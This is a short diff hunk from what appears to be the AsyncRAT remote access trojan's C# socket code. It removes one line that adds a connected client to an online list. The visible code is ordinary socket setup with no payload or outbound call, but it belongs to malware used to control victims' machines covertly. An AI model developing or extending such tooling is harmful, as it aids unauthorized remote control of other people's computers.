@@ -33,7 +33,6 @@ namespace AsyncRAT_Sharp.Sockets
             MS = new MemoryStream();
             LV = null;
             Read += HandlePacket.Read;
-            Settings.Online.Add(this);
             Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
         }
 
